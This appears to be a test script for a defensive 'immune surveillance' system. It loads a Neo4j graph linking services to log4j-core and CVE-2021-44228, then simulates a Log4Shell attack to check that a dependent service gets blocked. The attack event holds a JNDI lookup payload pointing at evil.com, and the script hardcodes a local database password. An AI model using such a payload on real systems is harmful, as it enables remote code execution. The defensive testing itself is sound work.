# -*- coding: utf-8 -*-
import sys
import os
import time
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from neo4j import GraphDatabase
from adaptive_security.evolutionary_agent import EvolutionaryAgent
from hierarchical_control.hierarchical_policy_engine import HierarchicalPolicyEngine
from proactive_remediation.immune_surveillance_system import ImmuneSurveillanceSystem

# 1. Topology Injection
def inject_simulation_data(uri, auth):
    driver = GraphDatabase.driver(uri, auth=auth)
    print("[INIT] Injecting Phase 24 Simulation Topology into Neo4j...")
    
    with driver.session() as session:
        # Create Services
        session.run("MERGE (:Service {id: 'LogService', exposed_paths: ['payload.content']})")
        session.run("MERGE (:Service {id: 'BillingService', exposed_paths: ['payload.content']})")
        session.run("MERGE (:Service {id: 'InventoryService', exposed_paths: ['item.sku']})")
        
        # Create Vulnerable Product and Library
        # Note: Ingestion created Product nodes. We ensure 'log4j-core' exists.
        session.run("MERGE (:Product {name: 'log4j-core'})")
        
        # Create Dependencies (Service -> Product)
        # LogService uses log4j-core
        session.run("""
        MATCH (s:Service {id: 'LogService'}), (p:Product {name: 'log4j-core'})
        MERGE (s)-[:DEPENDS_ON]->(p)
        """)
        
        # BillingService uses log4j-core
        session.run("""
        MATCH (s:Service {id: 'BillingService'}), (p:Product {name: 'log4j-core'})
        MERGE (s)-[:DEPENDS_ON]->(p)
        """)
        
        # Ensure CVE Linkage (Simulating Ingestion Result)
        # Link CVE-2021-44228 to log4j-core and CWE-502
        session.run("MERGE (c:CVE {id: 'CVE-2021-44228'})")
        session.run("MERGE (w:Weakness {description: 'CWE-502: Deserialization of Untrusted Data'})")
        
        session.run("""
        MATCH (c:CVE {id: 'CVE-2021-44228'}), (p:Product {name: 'log4j-core'})
        MERGE (c)-[:AFFECTS]->(p)
        """)
        
        session.run("""
        MATCH (c:CVE {id: 'CVE-2021-44228'}), (w:Weakness)
        WHERE w.description STARTS WITH 'CWE-502'
        MERGE (c)-[:HAS_WEAKNESS]->(w)
        """)
        
    driver.close()
    print("[INIT] Topology Injection Complete.")

# 2. Simulation Execution
def run_simulation():
    neo4j_uri = "bolt://localhost:7687"
    neo4j_auth = ("neo4j", "cve_password")
    
    # Prerequisite: Inject Graph Data
    inject_simulation_data(neo4j_uri, neo4j_auth)
    
    # Setup Engines
    print("\n[SETUP] Initializing Control Planes...")
    log_engine = HierarchicalPolicyEngine()
    log_engine.allow_path("payload.content")
    
    billing_engine = HierarchicalPolicyEngine()
    billing_engine.allow_path("payload.content")
    
    engine_map = {
        "LogService": log_engine,
        "BillingService": billing_engine
    }
    
    # Setup Agents
    rl_agent = EvolutionaryAgent(log_engine)
    # Train Agent to recognize the threat (Mock Training)
    # State: path='payload.content', anomaly=High, entropy=High
    state = rl_agent.get_state("payload.content", {'anomaly_score': 0.9, 'entropy': 0.9, 'frequency': 0.1})
    rl_agent.q_table[state] = [-50.0, 200.0] # SUPPRESS favored
    
    # Initialize Immune System
    immune_system = ImmuneSurveillanceSystem(rl_agent, neo4j_uri=neo4j_uri)
    
    # Attack Event
    attack_event = {
        "path": "payload.content",
        "payload_sample": "${jndi:ldap://evil.com/x} - exploit payload",
        "features": {'anomaly': 0.9, 'entropy': 0.9, 'frequency': 0.1}
    }
    
    print("\n[ATTACK] Simulating Log4Shell Attack on LogService...")
    response = immune_system.respond_to_attack(attack_event, "LogService", engine_map)
    
    # Verification
    print("\n[VERIFICATION] Checking System State...")
    billing_status = billing_engine.check_access("payload.content")
    print(f"BillingService Access to 'payload.content': {billing_status}")
    
    if billing_status == "BLOCKED_SUPPRESSED":
        print("\n✅ SUCCESS: BillingService was proactively hardened via Neo4j Graph Scan.")
    else:
        print("\n❌ FAILURE: BillingService was NOT hardened.")
        sys.exit(1)

if __name__ == "__main__":
    run_simulation()
